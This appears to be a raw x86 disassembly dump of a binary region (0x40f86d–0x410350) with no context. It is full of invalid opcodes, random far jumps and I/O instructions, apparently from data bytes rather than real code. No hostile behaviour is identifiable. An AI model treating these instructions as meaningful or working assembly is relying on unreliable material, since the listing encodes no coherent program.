  40f86d:	inc    edx
  40f86e:	add    al,0xe8
  40f870:	push   ebx
  40f871:	daa    
  40f872:	add    al,0x0
  40f874:	inc    ebp
  40f875:	ret    0x56e
  40f878:	daa    
  40f879:	dec    edx
  40f87a:	add    eax,DWORD PTR [eax]
  40f87c:	ds mov ebp,0x2f16146e
  40f882:	js     0x40f882
  40f884:	sbb    DWORD PTR [edx+0x74c2],ecx
	...
  40f8b2:	inc    ecx
  40f8b3:	pop    edx
  40f8b4:	add    BYTE PTR [edi+0x7f],0x82
  40f8b8:	out    0x74,eax
  40f8ba:	sub    ch,dl
  40f8bc:	cmc    
  40f8bd:	cmp    ecx,0xd
  40f8c0:	fisttp QWORD PTR [ecx]
  40f8c2:	fs and bh,0x74
  40f8c6:	push   edx
  40f8c7:	(bad)  
  40f8c9:	and    ecx,0x5b
  40f8cc:	data16 ja 0x40f881
  40f8cf:	cdq    
  40f8d0:	pop    esi
  40f8d1:	jmp    0x17fbd7a6
  40f8d6:	ins    BYTE PTR es:[edi],dx
  40f8d7:	sub    eax,DWORD PTR [ecx+0x1e]
  40f8da:	mov    ebx,0xe54458c
  40f8df:	mov    WORD PTR [ebx-0x1af94eed],?
  40f8e5:	call   0xf5825c1c
  40f8ea:	mov    ds:0x5fdc258c,eax
  40f8ef:	ficomp DWORD PTR ds:0xe83fa6e9
  40f8f5:	add    edi,DWORD PTR [esi]
  40f8f7:	fisubr WORD PTR [edx+0x3cd6b717]
  40f8fd:	jmp    0xfaef:0x27698c78
  40f904:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f905:	add    edi,DWORD PTR ds:0x965ba706
  40f90b:	sti    
  40f90c:	daa    
  40f90d:	add    al,0x59
  40f90f:	(bad)  
  40f910:	xchg   esp,eax
  40f911:	jmp    0x59018566
	...
  40f93e:	add    BYTE PTR [eax],al
  40f940:	fistp  DWORD PTR [edx-0x17]
  40f943:	cld    
  40f944:	add    DWORD PTR [edi],0x22c05c14
  40f94a:	sub    BYTE PTR [ecx+esi*1],al
  40f94d:	push   es
  40f94e:	fstp   st(3)
  40f950:	mov    dh,0xd6
  40f952:	lods   eax,DWORD PTR ds:[esi]
  40f953:	call   0xe99dbf78
  40f958:	sbb    BYTE PTR [eax+edi*1-0x6a291124],cl
  40f95f:	call   0x428fcdd
  40f964:	adc    ebp,ecx
  40f966:	sbb    cl,ch
  40f968:	jb     0x40f9cd
  40f96a:	xchg   ecx,eax
  40f96b:	(bad)  
  40f96c:	fwait
  40f96d:	mov    edi,edi
  40f96f:	jne    0x40f976
  40f971:	mov    ds:0x82d66e7f,al
  40f976:	shr    ecx,cl
  40f978:	cmp    eax,0x5d98685b
  40f97d:	sbb    al,BYTE PTR [eax]
  40f97f:	push   esi
  40f980:	cwde   
  40f981:	(bad)  
  40f982:	std    
  40f983:	dec    esi
  40f984:	(bad)  
  40f985:	jae    0x40f9af
  40f987:	aam    0x3d
  40f989:	pop    ebx
  40f98a:	or     ebp,DWORD PTR [ecx]
  40f98c:	and    DWORD PTR ds:0x1a656f68,edi
  40f992:	add    BYTE PTR [esi],ch
  40f994:	adc    BYTE PTR [edi-0x18],ah
  40f997:	stos   BYTE PTR es:[edi],al
  40f998:	sbb    DWORD PTR [ebp-0x381fe102],ecx
  40f99e:	std    
  40f99f:	push   ss
  40f9a0:	xchg   esi,eax
  40f9a1:	sbb    ebp,eax
  40f9a3:	bound  eax,QWORD PTR [eax]
	...
  40f9cd:	add    BYTE PTR [ecx],al
  40f9cf:	(bad)  
  40f9d0:	(bad)  
  40f9d1:	cdq    
  40f9d2:	pushw  es
  40f9d4:	adc    dh,bh
  40f9d6:	jecxz  0x40fa36
  40f9d8:	push   eax
  40f9d9:	neg    bl
  40f9db:	(bad)  
  40f9dc:	call   0xfecd4f3d
  40f9e1:	sar    DWORD PTR [ebp+0x59deff0b],1
  40f9e7:	(bad)  
  40f9e8:	mov    bl,0xd7
  40f9ea:	popa   
  40f9eb:	mov    edi,fs
  40f9ed:	pop    ds
  40f9ee:	in     eax,0x5a
  40f9f0:	add    BYTE PTR [edx+0x2a],ch
  40f9f3:	pop    ebp
  40f9f4:	jb     0x40f9cb
  40f9f6:	mov    ah,0xef
  40f9f8:	mov    bl,0xb7
  40f9fa:	and    DWORD PTR [edx+0x74bd9902],ecx
  40fa00:	add    DWORD PTR [edi],ecx
  40fa02:	ret    
  40fa03:	inc    esp
  40fa04:	sbb    cl,BYTE PTR cs:[edi+0x6a29eb5d]
  40fa0b:	fwait
  40fa0c:	pop    edi
  40fa0d:	sub    BYTE PTR [edx],bh
  40fa0f:	mov    dh,BYTE PTR [eax+eax*1-0x27ec5]
  40fa16:	iret   
  40fa17:	sahf   
  40fa18:	push   0x0
  40fa1a:	xlat   BYTE PTR ds:[ebx]
  40fa1b:	cs push 0x2037cc
  40fa21:	(bad)  
  40fa22:	mov    edx,0x70fffccb
  40fa27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa28:	mov    al,0x6c
  40fa2a:	xlat   BYTE PTR ds:[ebx]
  40fa2b:	pop    esi
  40fa2c:	push   eax
  40fa2d:	push   0x40ff0e
	...
  40fa5a:	add    BYTE PTR [eax],al
  40fa5c:	add    ah,cl
  40fa5e:	mov    dl,0xfe
  40fa60:	jo     0x40f9e4
  40fa62:	out    0xa1,al
  40fa64:	sbb    DWORD PTR [esi+0x0],0x5a
  40fa68:	into   
  40fa69:	test   DWORD PTR [esi-0x2f7a708b],edi
  40fa6f:	jne    0x40fa0c
  40fa71:	test   edi,eax
  40fa73:	je     0x40f9f6
  40fa75:	xchg   BYTE PTR es:[eax-0x2a],cl
  40fa79:	pop    esi
  40fa7a:	push   DWORD PTR [ebp-0x65]
  40fa7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa7e:	scas   eax,DWORD PTR es:[edi]
  40fa7f:	xor    DWORD PTR [eax-0x7f],0xfffffffd
  40fa83:	mov    ch,0x2b
  40fa85:	cmp    ebp,0xf7a6c7ff
  40fa8b:	and    DWORD PTR [eax-0x7f],0x4e
  40fa8f:	(bad)  
  40fa90:	jmp    0xff2e:0x6375ff6e
  40fa97:	jne    0x40faf8
  40fa99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa9a:	data16 cli 
  40fa9c:	add    BYTE PTR [ecx-0x7d8f0e1a],al
  40faa2:	std    
  40faa3:	lea    ebx,[edx-0x2f000364]
  40faa9:	sub    eax,0x80a3b5ff
  40faae:	std    
  40faaf:	jmp    FWORD PTR [edi+0x3e006b12]
  40fab5:	je     0x40fb36
  40fab7:	mov    edi,0xfe1fff31
  40fabc:	stc    
  40fabd:	loopne 0x40faa4
  40fabf:	mov    ah,0x0
	...
  40fae9:	add    BYTE PTR [edx-0x290119f7],dh
  40faef:	arpl   WORD PTR [ebx+0x0],bx
  40faf2:	ds stc 
  40faf4:	scas   eax,DWORD PTR es:[edi]
  40faf5:	mov    bh,0xd8
  40faf7:	add    dh,ah
  40faf9:	out    0xff,eax
  40fafb:	test   al,0xe5
  40fafd:	(bad)  
  40fafe:	div    DWORD PTR ds:0xfd6b0013
  40fb04:	(bad)  
  40fb05:	(bad)  
  40fb06:	xor    edx,DWORD PTR [eax+0x494e74e5]
  40fb0c:	jo     0x40fb1a
  40fb0e:	test   eax,0x2be7fac6
  40fb13:	aaa    
  40fb14:	out    0xfe,al
  40fb16:	xchg   DWORD PTR ds:0xceafff7,esi
  40fb1c:	xlat   BYTE PTR ds:[ebx]
  40fb1d:	add    BYTE PTR [edx+0xbff4e63],0xa8
  40fb24:	fidivr DWORD PTR [edx+0xae660c2]
  40fb2a:	jle    0x40fb3a
  40fb2c:	add    BYTE PTR [edi+0x77],bl
  40fb2f:	xor    eax,0xe60fff7
  40fb34:	adc    ebp,eax
  40fb36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb37:	mul    esp
  40fb39:	inc    BYTE PTR [ebp-0x4c]
  40fb3c:	outs   dx,BYTE PTR ds:[esi]
  40fb3d:	add    eax,0xbc1bae9
  40fb42:	ds cdq 
  40fb44:	outs   dx,BYTE PTR ds:[esi]
  40fb45:	or     al,0x26
  40fb47:	mov    bh,0x79
  40fb49:	(bad)  
  40fb4a:	xor    DWORD PTR [esi+0x74c2],ecx
	...
  40fb78:	cmp    DWORD PTR [edx],ebx
  40fb7a:	jle    0x40fbc3
  40fb7c:	jg     0x40fbf0
  40fb7e:	jecxz  0x40fbf4
  40fb80:	dec    edx
  40fb81:	pop    ebx
  40fb82:	xchg   ecx,eax
  40fb83:	add    bh,BYTE PTR [ebp+0x37d99d88]
  40fb89:	cmc    
  40fb8a:	call   0x81988673
  40fb8f:	out    dx,al
  40fb90:	mov    edi,0x7a7b8588
  40fb95:	(bad)  
  40fb96:	adc    BYTE PTR [ebx+0x5e],ch
  40fb99:	sbb    ch,cl
  40fb9b:	in     al,0x6a
  40fb9d:	pop    DWORD PTR [eax+0x6588bfde]
  40fba3:	jnp    0x40fc1f
  40fba5:	adc    eax,0xffffffd9
  40fba8:	retf   0xe95b
  40fbab:	fld    TBYTE PTR [esi+0x8]
  40fbae:	dec    esi
  40fbaf:	in     eax,0xc6
  40fbb1:	push   ds
  40fbb2:	inc    ebp
  40fbb3:	pop    esp
  40fbb4:	ds imul ebp,ecx,0x3
  40fbb8:	xchg   esi,eax
  40fbb9:	pop    ds
  40fbba:	mov    dh,0xe4
  40fbbc:	mov    al,ds:0x98f3a3d2
  40fbc1:	push   cs
  40fbc2:	and    esp,ebx
  40fbc4:	nop
  40fbc5:	fcomp  QWORD PTR ds:0xe59b34e5
  40fbcb:	jg     0x40fb8f
  40fbcd:	pop    ebx
  40fbce:	jmp    0x14f74d6
  40fbd3:	pop    esp
  40fbd4:	data16 xchg al,ch
  40fbd7:	add    ebp,DWORD PTR [ecx+0xe]
  40fbda:	cmc    
  40fbdb:	fild   DWORD PTR [eax]
	...
  40fc05:	add    BYTE PTR [ebx-0x42fc170b],ah
  40fc0b:	sub    edx,0xfffffff4
  40fc0e:	mov    ebx,0x3e03e8bf
  40fc13:	aam    0x53
  40fc15:	call   0xf52a43db
  40fc1a:	mov    ebp,0x3e03e8e2
  40fc1f:	repz data16 arpl WORD PTR [edi+0x5b],di
  40fc24:	add    BYTE PTR [esi],bl
  40fc26:	add    ah,BYTE PTR [esi]
  40fc28:	imul   ebp,ecx,0x3d
  40fc2b:	push   esp
  40fc2c:	rcr    BYTE PTR ds:0xa17488a3,0x65
  40fc33:	mov    BYTE PTR [esi],cl
  40fc35:	jmp    0x99b58477
  40fc3a:	xchg   ebp,eax
  40fc3b:	rol    DWORD PTR [edi+0x28],cl
  40fc3e:	cmp    dh,bl
  40fc40:	cwde   
  40fc41:	or     DWORD PTR [ebp+0x5b],edi
  40fc44:	push   edi
  40fc45:	sub    DWORD PTR [esi-0xb],0xc7d6e8ff
  40fc4c:	jae    0x40fc0f
  40fc4e:	fimul  DWORD PTR [esi]
  40fc50:	clc    
  40fc51:	sar    DWORD PTR [ebx+esi*8],cl
  40fc54:	(bad)  
  40fc55:	leave  
  40fc56:	jl     0x40fcb3
  40fc58:	push   edi
  40fc59:	inc    ecx
  40fc5a:	sub    al,0xf5
  40fc5c:	(bad)  
  40fc5d:	call   0xb4418c20
  40fc62:	pop    eax
  40fc63:	mov    BYTE PTR [ecx+edi*1-0x66],dh
  40fc67:	push   cs
  40fc68:	hlt    
  40fc69:	inc    ecx
	...
  40fc92:	add    BYTE PTR [eax],al
  40fc94:	pop    ebx
  40fc95:	(bad)  
  40fc97:	es in  eax,dx
  40fc99:	ror    edi,cl
  40fc9b:	adc    al,BYTE PTR [edi+eax*1+0x5c10c63a]
  40fca2:	(bad)  
  40fca3:	jmp    0x40fca6
  40fca5:	sbb    eax,0x5de11b0b
  40fcaa:	add    bl,0x3d
  40fcad:	push   cs
  40fcae:	out    dx,al
  40fcaf:	not    bl
  40fcb1:	push   0x50
  40fcb3:	out    dx,al
  40fcb4:	jmp    0x40fd08
  40fcb6:	call   0xfec95969
  40fcbb:	rcr    ebp,1
  40fcbd:	or     bh,bh
  40fcbf:	(bad)  
  40fcc0:	push   ecx
  40fcc1:	push   ebp
  40fcc2:	call   DWORD PTR [edx+esi*1-0x7a]
  40fcc6:	je     0x40fcc8
  40fcc8:	idiv   DWORD PTR [edx+0x73]
  40fccb:	or     BYTE PTR [edi],cl
  40fccd:	out    dx,al
  40fcce:	cld    
  40fccf:	(bad)  
  40fcd0:	call   0x8f012e50
  40fcd5:	jp     0x40fcd4
  40fcd7:	(bad)  
  40fcd8:	fsubr  DWORD PTR [ebp+0x6a2038ac]
  40fcde:	test   DWORD PTR [eax-0x58],ebp
  40fce1:	jp     0x40fce0
  40fce3:	call   DWORD PTR [edx-0x5d]
  40fce6:	out    0x55,al
  40fce8:	cmp    DWORD PTR [edx-0x3],edi
  40fceb:	push   edx
  40fced:	stos   BYTE PTR es:[edi],al
  40fcee:	out    0x4d,al
  40fcf0:	jmp    0xd340fa6e
  40fcf5:	mov    ds:0x45e6,al
	...
  40fd22:	fnstcw WORD PTR [ecx-0x3]
  40fd25:	push   edx
  40fd27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd28:	out    0x3d,al
  40fd2a:	jmp    0x9340faa8
  40fd2f:	mov    bh,ch
  40fd31:	jne    0x40fcde
  40fd33:	jns    0x40fda8
  40fd35:	or     BYTE PTR [edi],cl
  40fd37:	sub    eax,0x1a68fffe
  40fd3c:	leave  
  40fd3d:	ret    0x5a7b
  40fd40:	push   ebp
  40fd41:	mov    ebp,DWORD PTR [ebx]
  40fd43:	faddp  st(2),st
  40fd45:	call   0xff552172
  40fd4a:	mov    ds:0xbd8de68a,al
  40fd4f:	pop    edx
  40fd50:	add    BYTE PTR [ebx],cl
  40fd52:	daa    
  40fd53:	and    edx,DWORD PTR [edi+0x6a]
  40fd56:	push   edi
  40fd57:	repnz popf 
  40fd59:	pusha  
  40fd5a:	xchg   esi,eax
  40fd5b:	pop    edx
  40fd5c:	push   DWORD PTR [ebp+0x77]
  40fd5f:	jns    0x40fdd4
  40fd61:	or     al,0x6f
  40fd63:	test   DWORD PTR [edi-0x1],edi
  40fd66:	push   0x3e74c055
  40fd6b:	xor    esi,DWORD PTR [eax+edx*2]
  40fd6e:	es mov edx,0x8931fe89
  40fd74:	ret    0x6f73
  40fd77:	or     ecx,DWORD PTR [eax-0x18]
  40fd7a:	xchg   esp,eax
  40fd7b:	stos   BYTE PTR es:[edi],al
  40fd7c:	jmp    0xfe0a:0xe1b4bc41
  40fd83:	addr16 (bad) 
  40fd85:	inc    BYTE PTR [eax]
	...
  40fdaf:	add    BYTE PTR [ebx-0x1117cba4],dl
  40fdb5:	repnz loope 0x40fdb6
  40fdb8:	mov    ss,ebp
  40fdba:	push   edi
  40fdbb:	call   0x898db4e
  40fdc0:	(bad)  
  40fdc1:	test   al,0xe0
  40fdc3:	(bad)  
  40fdc4:	loope  0x40fda1
  40fdc6:	int    0x7c
  40fdc8:	fxtract 
  40fdca:	loope  0x40fe40
  40fdcc:	out    0x2b,al
  40fdce:	(bad)  
  40fdcf:	jl     0x40fd9a
  40fdd1:	and    al,0xeb
  40fdd3:	mov    ebp,0x67e22d43
  40fdd8:	ds jl  0x40fddd
  40fddb:	add    BYTE PTR [esi-0x56009fb8],ah
  40fde1:	or     cl,BYTE PTR [eax-0x8]
  40fde4:	mov    bl,0xb6
  40fde6:	fimul  WORD PTR [edi-0x67]
  40fde9:	into   
  40fdea:	repnz dec BYTE PTR [ebx]
  40fded:	nop
  40fdee:	jmp    0x7e0b:0x27417d3
  40fdf5:	out    0x52,al
  40fdf7:	mov    DWORD PTR [ebx],0x3e000364
  40fdfd:	je     0x40fdc8
  40fdff:	inc    esp
  40fe00:	jb     0x40fd86
  40fe02:	or     BYTE PTR [eax],al
  40fe04:	fiadd  DWORD PTR ds:[edx]
  40fe07:	push   0x3e
  40fe09:	fiadd  DWORD PTR [edx]
  40fe0b:	push   0x3e
  40fe0d:	pop    ebx
  40fe0e:	je     0x40fe57
  40fe10:	push   edx
  40fe11:	sub    bl,dh
  40fe13:	push   edi
	...
  40fe3c:	add    BYTE PTR [eax],al
  40fe3e:	inc    esi
  40fe3f:	test   DWORD PTR [ebx-0x2c],ebx
  40fe42:	cmp    BYTE PTR [edi],cl
  40fe44:	int    0xec
  40fe46:	jecxz  0x40fe3a
  40fe48:	call   0x34dc3350
  40fe4d:	push   es
  40fe4e:	adc    eax,0x818a4142
  40fe53:	sbb    ch,cl
  40fe55:	loopne 0x40fde1
  40fe57:	imul   edx,DWORD PTR [ecx-0x627b40fa],0xffffffe1
  40fe5e:	mov    al,BYTE PTR [ebx-0x257513c8]
  40fe64:	(bad)  
  40fe65:	loope  0x40fe2d
  40fe67:	push   ds
  40fe68:	xchg   ebp,eax
  40fe69:	loope  0x40fedd
  40fe6b:	arpl   WORD PTR [esi+0x57],di
  40fe6e:	dec    edx
  40fe6f:	test   bl,bh
  40fe71:	out    dx,eax
  40fe72:	fmul   DWORD PTR [esi]
  40fe74:	fucom  st(0)
  40fe76:	dec    edx
  40fe77:	push   ebx
  40fe78:	push   ecx
  40fe79:	sti    
  40fe7a:	enter  0x5d84,0xe1
  40fe7e:	dec    edx
  40fe7f:	ja     0x40fec1
  40fe81:	sbb    eax,0xe14d843b
  40fe86:	cli    
  40fe87:	mov    dl,BYTE PTR [ecx-0x7f]
  40fe8a:	test   al,0xe
  40fe8c:	cmp    eax,0xe8f207ec
  40fe91:	add    ebx,DWORD PTR [ecx+0x5bec310e]
  40fe97:	push   es
  40fe98:	es loope 0x40ff11
  40fe9b:	cdq    
  40fe9c:	hlt    
  40fe9d:	add    ebp,ebx
  40fe9f:	iret   
  40fea0:	add    al,0x83
	...
  40feca:	add    BYTE PTR [eax],al
  40fecc:	jge    0x40fe5d
  40fece:	push   cs
  40fecf:	loope  0x40ff41
  40fed1:	icebp  
  40fed2:	call   0x73c52144
  40fed7:	or     edx,DWORD PTR [esi+0x1e]
  40feda:	add    BYTE PTR [ebx+0x5e],dh
  40fedd:	test   DWORD PTR [eax+0x49d71a4],ecx
  40fee3:	pop    eax
  40fee4:	loop   0x40feff
  40fee6:	add    cl,ch
  40fee8:	cmp    eax,0xc064005b
  40feed:	mov    ebp,?
  40feef:	into   
  40fef0:	push   ds
  40fef1:	adc    al,0x68
  40fef3:	in     eax,dx
  40fef4:	cmp    al,0x5b
  40fef6:	add    cl,dl
  40fef8:	out    dx,al
  40fef9:	sti    
  40fefa:	(bad)  
  40fefb:	call   0x28a21aa5
  40ff00:	cmp    dh,bl
  40ff02:	aaa    
  40ff03:	or     BYTE PTR [ebp+0x5b],bh
  40ff06:	push   0x1a9d3b
  40ff0b:	xchg   esi,eax
  40ff0c:	push   eax
  40ff0d:	mov    cl,0x47
  40ff0f:	sub    BYTE PTR [edx],bh
  40ff11:	test   BYTE PTR [ecx+esi*8-0x2b],dh
  40ff15:	mov    ebx,0xfbde7efd
  40ff1a:	aas    
  40ff1b:	or     BYTE PTR [ebp+0x5b],bh
  40ff1e:	push   0x1a5cb1
  40ff23:	rcl    DWORD PTR [ebx],1
  40ff25:	cli    
  40ff26:	inc    eax
  40ff27:	jmp    0xe9415881
  40ff2c:	mov    ebp,0xe17484
	...
  40ff59:	add    BYTE PTR [ebp-0x61b90231],ah
  40ff5f:	(bad)  
  40ff60:	test   BYTE PTR [esi],dh
  40ff62:	lahf   
  40ff63:	test   dh,bh
  40ff65:	cdq    
  40ff66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff67:	sub    ebp,DWORD PTR [eax-0x17]
  40ff6a:	cmp    eax,0x9e257484
  40ff6f:	push   cs
  40ff70:	or     BYTE PTR [ecx],dl
  40ff72:	add    BYTE PTR [ecx],0xff
  40ff75:	push   ss
  40ff76:	test   BYTE PTR [ecx-0x2fd716fd],bl
  40ff7c:	jmp    0x40ff7e
  40ff7e:	(bad)  
  40ff7f:	fwait
  40ff80:	repnz (bad) 
  40ff82:	pusha  
  40ff83:	mov    ds:0x3cbd0068,eax
  40ff88:	push   DWORD PTR [ebp+0x5f]
  40ff8b:	outs   dx,DWORD PTR ds:[esi]
  40ff8c:	mov    esp,0x87a36079
  40ff91:	inc    ebp
  40ff92:	arpl   ax,si
  40ff94:	sbb    eax,ebp
  40ff96:	sti    
  40ff97:	xlat   BYTE PTR ds:[ebx]
  40ff98:	std    
  40ff99:	call   FWORD PTR [edi+ebx*4]
  40ff9c:	jb     0x40ffc2
  40ff9e:	(bad)  
  40ff9f:	pop    ss
  40ffa0:	popa   
  40ffa1:	inc    ecx
  40ffa2:	pop    ss
  40ffa3:	dec    edi
  40ffa4:	call   0xfde3a709
  40ffa9:	push   eax
  40ffaa:	jg     0x410003
  40ffac:	adc    bh,ch
  40ffae:	mov    eax,ds:0x566183ef
  40ffb3:	push   edi
  40ffb4:	push   eax
  40ffb5:	call   FWORD PTR [edx+0x4f]
  40ffb8:	call   0xfde37a08
  40ffbd:	call   0x40ffc2
	...
  40ffe6:	add    BYTE PTR [eax],al
  40ffe8:	dec    ebx
  40ffe9:	sti    
  40ffea:	(bad)  
  40ffeb:	call   FWORD PTR [eax+0x26607154]
  40fff1:	push   edi
  40fff2:	add    DWORD PTR [eax],eax
  40fff4:	out    0x5e,eax
  40fff6:	lea    eax,[ebp-0x25e98]
  40fffc:	xchg   esi,esi
  40fffe:	add    eax,DWORD PTR [ecx]
  410000:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410001:	pop    esi
  410002:	call   0x9f7900
  410007:	push   0x40f7d7
  41000c:	(bad)  
  41000d:	popaw  
  41000f:	inc    ecx
  410010:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410011:	not    BYTE PTR [ecx+0x61]
  410014:	out    0x5e,al
  410016:	push   DWORD PTR ds:0x410eed
  41001c:	and    BYTE PTR [eax+ecx*1],ah
  41001f:	call   0xff226662
  410024:	jno    0x410002
  410026:	inc    edx
  410027:	popa   
  410028:	push   DWORD PTR [ebx+0x6a]
  41002b:	cmp    bh,bl
  41002d:	mov    dl,0x2
  41002f:	push   0x43d2ec
  410034:	out    0x75,al
  410036:	add    al,BYTE PTR [eax]
  410038:	mov    esi,0x56085779
  41003d:	retf   0xfedf
  410040:	cmp    edi,esi
  410042:	xchg   esi,esi
  410044:	xor    BYTE PTR [ecx-0x29e9b023],dl
  41004a:	add    BYTE PTR gs:[eax],al
	...
  410075:	add    BYTE PTR [esi],bh
  410077:	rcl    DWORD PTR [edi-0x4],0x19
  41007b:	aas    
  41007c:	or     al,0xe8
  41007e:	cdq    
  41007f:	dec    ebx
  410080:	(bad)  
  410082:	div    DWORD PTR [ebp+0xd6b0006]
  410088:	out    dx,eax
  410089:	add    BYTE PTR [edx],0xe0
  41008c:	fdiv   st(6),st
  41008e:	icebp  
  41008f:	pop    ebp
  410090:	add    al,0x6a
  410092:	and    cl,bl
  410094:	push   edi
  410095:	or     dh,dl
  410097:	mov    ebx,DWORD PTR [ebx-0x1]
  41009a:	fsqrt  
  41009c:	inc    edi
  41009d:	cld    
  41009e:	stc    
  41009f:	jbe    0x4100f4
  4100a1:	pusha  
  4100a2:	jg     0x410118
  4100a4:	add    al,BYTE PTR [eax]
  4100a6:	ds je  0x410038
  4100a9:	test   BYTE PTR [ecx+0xefede29],dh
  4100af:	pushf  
  4100b0:	push   es
  4100b1:	add    DWORD PTR [esi],edi
  4100b3:	je     0x41009f
  4100b5:	jno    0x4100d0
  4100b7:	je     0x4100bb
  4100b9:	push   0x4392b9
  4100be:	es daa 
  4100c0:	fs inc ecx
  4100c2:	ds pop ebx
  4100c4:	xchg   ecx,eax
  4100c5:	xor    DWORD PTR [edi],ebx
  4100c7:	sbb    al,0xe9
  4100c9:	fidiv  WORD PTR [edx]
  4100cb:	mov    ch,0xa0
  4100cd:	inc    esp
  4100ce:	adc    BYTE PTR ds:[ebx+0x3f5560b],0xde
  4100d6:	pusha  
  4100d7:	repnz pop ebp
  4100d9:	add    BYTE PTR fs:[eax],al
	...
  410104:	call   FWORD PTR [edx-0x7f]
  410107:	js     0x4100e7
  410109:	sbb    ebp,ecx
  41010b:	imul   ebp,esp,0xfffffffb
  41010e:	daa    
  41010f:	add    al,0xd6
  410111:	pop    esp
  410112:	jmp    0x5bc1bf1a
  410117:	or     al,0x26
  410119:	adc    esp,ecx
  41011b:	(bad)  [eax]
  41011d:	iret   
  41011e:	imul   edx,ebp,0x23
  410121:	cmp    DWORD PTR [ebp+0x4e652634],0x33803e04
  41012b:	loopne 0x410135
  41012d:	pop    es
  41012e:	icebp  
  41012f:	jmp    0x410112
  410131:	add    ebx,DWORD PTR [esi-0x1361f923]
  410137:	add    ecx,DWORD PTR [ebx-0x27c832c]
  41013d:	xchg   DWORD PTR [esi-0x170a1f23],eax
  410143:	imul   esp,DWORD PTR [ecx],0xe60bfb80
  410149:	(bad)  
  41014b:	fmul   st(0),st
  41014d:	shr    BYTE PTR [ebx-0x27a90721],cl
  410153:	arpl   di,di
  410155:	pop    edx
  410156:	jmp    0x5c9c3f5e
  41015b:	xchg   DWORD PTR [eax-0xe22ba7f],esi
  410161:	repnz in al,0x2
  410164:	ds pop ebx
  410166:	add    BYTE PTR [ecx+0x0],al
	...
  410191:	add    BYTE PTR [edi+0x15e8fff6],ah
  410197:	ret    0xa860
  41019a:	cmp    eax,0xfc88b2f3
  41019f:	pop    edx
  4101a0:	push   0x19dcbb
  4101a5:	push   cs
  4101a6:	push   ecx
  4101a7:	mov    ch,0x47
  4101a9:	test   al,0x3d
  4101ab:	xor    BYTE PTR [ecx+esi*8+0x65],0x7c
  4101b0:	sti    
  4101b1:	div    BYTE PTR [edx-0x8]
  4101b4:	mov    eax,0x685afc88
  4101b9:	call   0xfa6c:0x510019dc
  4101c0:	inc    eax
  4101c1:	jmp    0xe9415f6b
  4101c6:	mov    ebp,0x15f17480
  4101cb:	cwde   
  4101cc:	sti    
  4101cd:	mov    esi,0xbe84cefa
  4101d2:	repz cmp dh,0x19
  4101d6:	sbb    ch,ah
  4101d8:	gs jmp 0x9db5821b
  4101de:	sbb    al,BYTE PTR [edi]
  4101e0:	or     BYTE PTR [ecx-0x7100fccc],al
  4101e6:	hlt    
  4101e7:	cdq    
  4101e8:	add    ebp,ecx
  4101ea:	sub    ah,dl
  4101ec:	jmp    0x410256
  4101ee:	add    DWORD PTR [ebp+edi*8-0xe0d8a],ecx
  4101f5:	add    al,BYTE PTR [eax]
	...
  41021f:	add    BYTE PTR [edx],bl
  410221:	xor    BYTE PTR [ecx+esi*8-0x2b],0x81
  410226:	jbe    0x410286
  410228:	call   0x7156:0x7a5544d2
  41022f:	leave  
  410230:	cld    
  410231:	pop    edx
  410232:	add    BYTE PTR [eax],al
  410234:	xchg   edi,eax
  410235:	pop    ebx
  410236:	add    BYTE PTR [ebp-0x358de],cl
  41023c:	dec    eax
  41023d:	dec    esp
  41023e:	push   0x5b9604
  410243:	call   0x40f7fb
  410248:	iret   
  410249:	int3   
  41024a:	pop    edi
  41024b:	inc    ecx
  41024c:	addr16 repz enter 0x9661,0x5b
  410252:	push   0x1cb652
  410257:	call   DWORD PTR [edx+0x674146b1]
  41025d:	sahf   
  41025e:	jae    0x410268
  410260:	aas    
  410261:	inc    ecx
  410262:	cld    
  410263:	call   FWORD PTR [eax-0x12]
  410266:	shl    BYTE PTR [ecx+0x66],1
  410269:	push   edi
  41026a:	push   0x1886c9
  41026f:	push   0x40f865
  410274:	(bad)  
  410275:	push   ebp
  410276:	add    BYTE PTR [eax],al
  410278:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410279:	mov    ds:0x18ff0873,al
  41027e:	cld    
  41027f:	(bad)  
  410280:	fcom   st(4)
  410282:	xor    edi,0x0
	...
  4102ad:	add    cl,bl
  4102af:	mov    ds:0x54cf50fd,al
  4102b4:	data16 add bh,ah
  4102b7:	mov    eax,ds:0x2cb8fc73
  4102bc:	or     al,ch
  4102be:	lds    ebp,FWORD PTR [edx]
  4102c0:	(bad)  
  4102c1:	dec    DWORD PTR [esi+0x32000295]
  4102c7:	into   
  4102c8:	jmp    0xed00:0x68a3a383
  4102cf:	das    
  4102d0:	push   DWORD PTR [ebp-0x51]
  4102d3:	jb     0x410349
  4102d5:	ja     0x410315
  4102d7:	and    eax,0x100388db
  4102dc:	outs   dx,BYTE PTR ds:[esi]
  4102dd:	add    BYTE PTR [esi],dl
  4102df:	ds gs inc ecx
  4102e2:	lods   al,BYTE PTR ds:[esi]
  4102e4:	fisub  WORD PTR [eax-0x1]
  4102e7:	jae    0x4102c2
  4102e9:	xor    al,0xd4
  4102eb:	mov    esp,0x78960043
  4102f0:	push   edi
  4102f1:	(bad)  
  4102f2:	jns    0x41027d
  4102f4:	ret    0x5773
  4102f7:	les    ebp,FWORD PTR [edx+0x0]
  4102fa:	ds jge 0x410295
  4102fd:	addr16 cmp dl,dl
  410300:	inc    ebx
  410301:	add    dh,ch
  410303:	jl     0x410354
  410305:	or     BYTE PTR [esi-0x7a],ah
  410308:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410309:	dec    BYTE PTR [ecx+0x5c]
  41030c:	add    edi,DWORD PTR [edx+0x41]
  41030f:	jne    0x41037d
	...
  410339:	add    BYTE PTR [eax],al
  41033b:	add    BYTE PTR [esi+0x3e41639f],ah
  410341:	sbb    al,0xe0
  410343:	pusha  
  410344:	jg     0x4103ba
  410346:	fnstenv [esp+edx*8]
  410349:	dec    ebx
  41034a:	inc    ebp
  41034b:	add    BYTE PTR [esi],ah
  41034d:	mov    WORD PTR [edi-0x1],ss
  410350:	adc    DWORD PTR [ecx-0x3e],edi
